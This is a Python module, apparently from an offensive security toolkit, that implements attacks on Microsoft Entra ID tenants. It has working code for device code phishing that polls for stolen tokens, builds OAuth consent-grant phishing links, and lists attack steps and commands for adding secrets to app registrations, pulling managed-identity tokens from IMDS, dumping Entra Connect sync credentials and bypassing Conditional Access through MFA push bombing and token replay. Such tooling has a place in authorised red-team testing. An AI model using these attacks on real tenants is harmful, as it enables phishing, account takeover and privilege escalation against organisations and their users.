"""Azure AD / Entra ID attack module — Graph API abuse, OAuth consent grants, device code phishing.

Provides attack primitives against Microsoft Entra ID (formerly Azure AD):
OAuth application consent grant attacks, device code phishing, service
principal credential theft, managed identity abuse, and Entra Connect
synchronization exploitation.

Requires requests and msal libraries for Graph API operations.
"""

from __future__ import annotations

import time
import uuid
from dataclasses import dataclass
from typing import Any

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

GRAPH_API_BASE = "https://graph.microsoft.com/v1.0"
LOGIN_BASE = "https://login.microsoftonline.com"
DEVICE_CODE_ENDPOINT = f"{LOGIN_BASE}/common/oauth2/devicecode"
TOKEN_ENDPOINT = "/oauth2/v2.0/token"

ENTRA_ID_ATTACKS = [
    "device_code_phishing",
    "oauth_consent_grant",
    "service_principal_credential_theft",
    "managed_identity_abuse",
    "entra_connect_sync",
    "conditional_access_bypass",
    "privileged_role_abuse",
    "admin_consent_request",
    "group_writeback_abuse",
    "cross_tenant_attacks",
]

GRAPH_SCOPES = [
    "https://graph.microsoft.com/.default",
    "https://graph.microsoft.com/Mail.Read",
    "https://graph.microsoft.com/Mail.ReadWrite",
    "https://graph.microsoft.com/Files.ReadWrite.All",
    "https://graph.microsoft.com/User.Read.All",
    "https://graph.microsoft.com/Directory.AccessAsUser.All",
    "https://graph.microsoft.com/RoleManagement.ReadWrite.Directory",
    "https://graph.microsoft.com/Application.ReadWrite.All",
    "https://graph.microsoft.com/Policy.ReadWrite.ConditionalAccess",
]


@dataclass
class EntraIDConfig:
    """Configuration for Entra ID attack operations.

    Attributes:
        tenant_id: Azure tenant ID (or 'common', 'organizations', 'consumers').
        client_id: Application registration client ID.
        client_secret: Application client secret.
        username: Target user principal name.
        password: Target user password.
        refresh_token: OAuth refresh token (if already obtained).
        access_token: Bearer token for Graph API.
        graph_api_base: Microsoft Graph API endpoint.
    """

    tenant_id: str = "common"
    client_id: str = ""
    client_secret: str = ""
    username: str = ""
    password: str = ""
    refresh_token: str = ""
    access_token: str = ""
    graph_api_base: str = GRAPH_API_BASE


class EntraIDAttackEngine:
    """Execute Entra ID attacks against Azure AD / Microsoft 365 tenants.

    Implements OAuth consent grant, device code phishing, service principal
    credential abuse, and managed identity escalation paths.

    Attributes:
        config: EntraIDConfig with tenant and authentication details.
        session: Requests session with bearer token.
    """

    def __init__(self, config: EntraIDConfig | None = None):
        self.config = config or EntraIDConfig()
        self.session = requests.Session() if HAS_REQUESTS else None

    def device_code_phish(self, scope: str = "https://graph.microsoft.com/.default") -> dict[str, Any]:
        """Initiate a device code phishing flow.

        Generates a device code and user code for the target tenant.
        The user authenticates at https://microsoft.com/devicelogin.

        Args:
            scope: OAuth scope to request.

        Returns:
            Dict with device_code, user_code, verification_uri, and polling info.
        """
        data = {
            "client_id": self.config.client_id or "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "resource": scope,
        }
        resp = self.session.post(DEVICE_CODE_ENDPOINT, data=data, timeout=30) if self.session else None
        result = resp.json() if resp else {}

        return {
            "attack_type": "device_code_phishing",
            "device_code": result.get("device_code", ""),
            "user_code": result.get("user_code", ""),
            "verification_uri": result.get("verification_uri", "https://microsoft.com/devicelogin"),
            "message": result.get("message", ""),
            "expires_in": result.get("expires_in", 900),
            "interval": result.get("interval", 5),
            "instructions": (
                f"Send user to {result.get('verification_uri', 'https://microsoft.com/devicelogin')} "
                f"and enter code: {result.get('user_code', '')}"
            ),
        }

    def poll_device_code(self, device_code: str, interval: int = 5, timeout: int = 900) -> dict[str, Any]:
        """Poll for device code completion to retrieve tokens.

        Args:
            device_code: Device code from device_code_phish().
            interval: Polling interval in seconds.
            timeout: Maximum polling time in seconds.

        Returns:
            Dict with access_token, refresh_token, id_token, or error.
        """
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": self.config.client_id or "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "device_code": device_code,
        }
        token_url = f"{LOGIN_BASE}/{self.config.tenant_id}/oauth2/token"

        start = time.time()
        while (time.time() - start) < timeout:
            resp = self.session.post(token_url, data=data, timeout=10) if self.session else None
            result = resp.json() if resp else {}
            if "access_token" in result:
                return {
                    "access_token": result["access_token"],
                    "refresh_token": result.get("refresh_token", ""),
                    "id_token": result.get("id_token", ""),
                    "expires_in": result.get("expires_in", 0),
                    "scope": result.get("scope", ""),
                }
            if result.get("error") == "authorization_pending":
                time.sleep(interval)
                continue
            return {"error": result.get("error", "unknown"), "description": result.get("error_description", "")}

        return {"error": "timeout", "description": "Device code polling timed out"}

    def oauth_consent_grant(self, redirect_uri: str = "https://localhost") -> dict[str, Any]:
        """Generate an OAuth consent grant phishing URL.

        Creates an application consent link that grants the attacker's
        application permissions to the tenant when approved by a user.

        Args:
            redirect_uri: OAuth redirect URI.

        Returns:
            Dict with consent_url and required permissions.
        """
        consent_scopes = [
            "offline_access",
            "User.Read",
            "Mail.Read",
            "Files.ReadWrite.All",
            "Sites.ReadWrite.All",
        ]

        consent_url = (
            f"{LOGIN_BASE}/{self.config.tenant_id}/oauth2/v2.0/authorize?"
            f"client_id={self.config.client_id}&"
            f"response_type=code&"
            f"redirect_uri={redirect_uri}&"
            f"response_mode=query&"
            f"scope={' '.join(consent_scopes)}&"
            f"state={uuid.uuid4().hex}"
        )

        return {
            "attack_type": "oauth_consent_grant",
            "consent_url": consent_url,
            "scopes": consent_scopes,
            "instructions": "Send this URL to the target user. On consent, capture the authorization code from the redirect.",
        }

    def service_principal_credential_theft(self) -> dict[str, Any]:
        """Plan service principal credential theft via app registration abuse.

        If the attacker has Application.ReadWrite.All or Application Administrator
        role, they can add credentials (certificates/secrets) to any app registration
        and impersonate it.

        Returns:
            Dict with attack steps and Graph API commands.
        """
        return {
            "attack_type": "service_principal_credential_theft",
            "description": "Add credentials to an existing App Registration to steal its identity",
            "requirements": [
                "Application.ReadWrite.All permission or Application Administrator role",
                "Graph API access token",
            ],
            "steps": [
                "1. List all app registrations via GET /applications",
                "2. Identify high-privilege app registrations (Directory.ReadWrite.All, RoleManagement, etc.)",
                "3. Add a new password credential to the target app via POST /applications/{id}/addPassword",
                "4. Use the new secret to authenticate as the service principal",
                "5. Elevate via the service principal's permissions",
            ],
            "graph_api_commands": [
                "GET /applications?$select=id,displayName,requiredResourceAccess",
                "GET /servicePrincipals?$select=id,appDisplayName,appRoles",
                "POST /applications/{app_id}/addPassword -d '{\"passwordCredential\": {\"displayName\": \"Test\"}}'",
                "POST /oauth2/v2.0/token with client_credentials grant using stolen secret",
            ],
        }

    def managed_identity_abuse(self, resource: str = "https://graph.microsoft.com") -> dict[str, Any]:
        """Exploit Azure managed identities from compromised VMs/containers.

        Managed identities provide automatic tokens to Azure resources.
        IMDS (169.254.169.254) exposes the identity endpoint.

        Args:
            resource: Token audience (resource).

        Returns:
            Dict with IMDS commands and token extraction.
        """
        return {
            "attack_type": "managed_identity_abuse",
            "description": "Extract tokens from Azure Instance Metadata Service",
            "imds_endpoints": {
                "metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "token_system": f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}",
                "token_user": f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id=CLIENT_ID&resource={resource}",
            },
            "curl_commands": [
                f"curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}'",
                "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
            ],
            "tool_references": [
                "Use tokens with Azure CLI: az login --identity",
                "Use tokens with Az PowerShell: Connect-AzAccount -Identity",
                "Graph API with token: Authorization: Bearer TOKEN",
            ],
        }

    def entra_connect_sync_abuse(self) -> dict[str, Any]:
        """Exploit Entra Connect Sync for on-prem to cloud privilege escalation.

        The Entra Connect Sync service account has DCSync privileges on
        the on-prem AD and write access to Entra ID.

        Returns:
            Dict with attack path and exploitation commands.
        """
        return {
            "attack_type": "entra_connect_sync",
            "description": "Abuse Entra Connect Sync (AAD Connect) for bidirectional privilege escalation",
            "attack_paths": [
                {
                    "direction": "on_prem_to_cloud",
                    "description": "Compromise Entra Connect server -> extract Sync account creds -> modify Entra ID objects",
                    "steps": [
                        "1. Compromise the Entra Connect server (admin access)",
                        "2. Dump LSASS for MSOL_* or AAD_* service account credentials",
                        "3. The service account has Directory Synchronization Accounts role",
                        "4. Use AADInternals or AzureAD module to modify cloud objects",
                    ],
                },
                {
                    "direction": "cloud_to_on_prem",
                    "description": "Compromise Entra ID -> modify sync'd objects -> trigger password writeback -> on-prem admin",
                    "steps": [
                        "1. Compromise Global Admin or Hybrid Identity Admin in Entra ID",
                        "2. Modify a synchronized admin user's password in Entra ID",
                        "3. Password writeback changes on-prem AD password",
                        "4. Use new password for on-prem access",
                    ],
                },
            ],
            "commands": [
                "Get-AADIntSyncCredentials",
                "Get-AADIntAccessTokenForAADGraph -Credentials $creds",
                "Set-AADIntUserPassword -SourceAnchor 'USER_ANCHOR' -NewPassword 'NewP@ssw0rd!'",
            ],
        }

    def conditional_access_bypass(self) -> dict[str, Any]:
        """Techniques for bypassing Entra ID Conditional Access policies.

        Returns:
            Dict with bypass techniques and their prerequisites.
        """
        return {
            "attack_type": "conditional_access_bypass",
            "techniques": [
                {
                    "name": "Legacy Authentication",
                    "description": "Use legacy protocols (POP3, IMAP, SMTP Auth) that bypass CA",
                    "check": "Test tenant for legacy auth support",
                    "command": "Get-AzureADPolicy | Where-Object {$_.Type -eq 'AuthorizationPolicy'}",
                },
                {
                    "name": "Device Registration",
                    "description": "Register attacker device in Entra ID to satisfy device compliance CA",
                    "command": "Register device via Intune enrollment or Workplace Join",
                },
                {
                    "name": "Location Spoofing",
                    "description": "Use a VPS in the required IP range or country to satisfy named locations",
                    "command": "Route traffic through VPN/proxy in allowed location",
                },
                {
                    "name": "MFA Fatigue / Push Bombing",
                    "description": "Flood user with MFA prompts until they accept",
                    "command": "Repeated authentication attempts timed closely",
                },
                {
                    "name": "Token Replay",
                    "description": "Steal primary refresh token (PRT) from a compliant device",
                    "command": "Road token replay from lsass or browser process on compromised device",
                },
            ],
        }

    def enumerate_tenant(self) -> dict[str, Any]:
        """Enumerate tenant information via Graph API.

        Returns:
            Dict with tenant details, domains, users, and apps.
        """
        return {
            "attack_type": "tenant_enumeration",
            "graph_endpoints": {
                "organization": f"{GRAPH_API_BASE}/organization",
                "domains": f"{GRAPH_API_BASE}/domains",
                "users": f"{GRAPH_API_BASE}/users?$top=10&$select=id,displayName,userPrincipalName,userType",
                "applications": f"{GRAPH_API_BASE}/applications?$select=id,displayName",
                "servicePrincipals": f"{GRAPH_API_BASE}/servicePrincipals?$top=20",
                "directoryRoles": f"{GRAPH_API_BASE}/directoryRoles",
            },
            "curl_examples": [
                f"curl -H 'Authorization: Bearer TOKEN' '{GRAPH_API_BASE}/organization'",
                f"curl -H 'Authorization: Bearer TOKEN' '{GRAPH_API_BASE}/users?$filter=userType eq \"Guest\"'",
                f"curl -H 'Authorization: Bearer TOKEN' '{GRAPH_API_BASE}/directoryRoles?$expand=members'",
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "available_attacks": ENTRA_ID_ATTACKS,
            "graph_scopes": GRAPH_SCOPES,
            "tenant_id": self.config.tenant_id,
            "graph_endpoints": self.enumerate_tenant()["graph_endpoints"],
        }
